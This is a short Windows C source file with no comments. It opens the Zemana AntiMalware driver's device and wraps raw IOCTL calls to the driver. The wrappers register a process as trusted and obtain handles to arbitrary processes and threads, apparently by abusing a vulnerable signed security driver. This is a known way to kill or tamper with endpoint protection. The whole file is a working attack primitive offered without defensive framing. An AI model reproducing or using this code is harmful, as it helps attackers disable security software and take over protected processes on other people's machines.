#define _WIN32_LEAN_AND_MEAN
#include <windows.h>

HANDLE ZemanaOpenHandle()
{
	return CreateFileA
	(
		"\\\\.\\ZemanaAntiMalware",
		GENERIC_READ | GENERIC_WRITE,
		0, NULL, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, NULL
	);
};

BOOL ZemanaRegisterProcess( _In_ HANDLE hDevice,
                            _In_ DWORD TrustedProcess )
{
	DWORD ReturnedSize = 0;
	return DeviceIoControl(hDevice,
			       0x80002010,
			       &TrustedProcess,
			       sizeof(DWORD),
			       NULL,
			       0,
			       &ReturnedSize,
			       NULL);
};

BOOL ZemanaOpenProcess( _In_ HANDLE hDevice,
                        _In_ DWORD ProcessNumber,
                        _Out_ PHANDLE ProcessHandle )
{
	DWORD ReturnedSize = 0;
	return DeviceIoControl(hDevice,
                               0x8000204C,
                               &ProcessNumber,
                               sizeof(DWORD),
                               ProcessHandle,
                               sizeof(HANDLE),
                               &ReturnedSize,
                               NULL);
};

BOOL ZemanaOpenThread( _In_  HANDLE  hDevice,
                       _In_  DWORD   ThreadId,
                       _Out_ PHANDLE ThreadHandle )
{
	DWORD ReturnSize = 0;
	return DeviceIoControl(hDevice,
			       0x80002084,
			       &ThreadId,
			       sizeof(DWORD),
			       ThreadHandle,
			       sizeof(HANDLE),
			       &ReturnSize,
			       NULL);
};
